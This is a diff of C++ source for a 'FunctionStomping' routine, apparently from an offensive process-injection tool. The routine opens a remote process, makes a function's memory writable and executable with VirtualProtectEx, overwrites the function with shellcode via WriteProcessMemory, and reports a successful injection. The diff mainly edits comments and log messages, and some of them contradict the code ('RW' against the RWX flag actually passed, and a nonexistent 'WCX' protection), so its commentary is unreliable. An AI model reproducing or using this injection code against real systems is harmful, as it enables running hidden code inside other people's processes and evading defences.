@@ -59,7 +59,7 @@ int FunctionStomping(DWORD pid)
 
     std::cout << "[+] Got function base!" << std::endl;
 
-    // Changing the protection of the function's address to RWX and writing our shellcode.
+    // Verifying that the shellcode isn't too big.
     DWORD oldPermissions;
     SIZE_T sizeToWrite = sizeof(shellcode);
 
@@ -69,14 +69,17 @@ int FunctionStomping(DWORD pid)
         return -1;
     }
 
+    // Changing the protection to READWRITE to write the shellcode.
     if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
         std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
         CloseHandle(procHandle);
         return -1;
     }
+    std::cout << "[+] Changed protection to RW to write the shellcode." << std::endl;
 
     SIZE_T written;
 
+    // Writing the shellcode to the remote process.
     if (!WriteProcessMemory(procHandle, functionBase, shellcode, sizeof(shellcode), &written)) {
         std::cerr << "[-] Failed to overwrite function: " << GetLastError() << std::endl;
         VirtualProtectEx(procHandle, functionBase, sizeToWrite, oldPermissions, &oldPermissions);
@@ -93,7 +96,7 @@ int FunctionStomping(DWORD pid)
         return -1;
     }
 
-    std::cout << "[+] Changed protection to WCX instead of RWX!" << std::endl;
+    std::cout << "[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!" << std::endl;
 
     CloseHandle(procHandle);
     return 0;
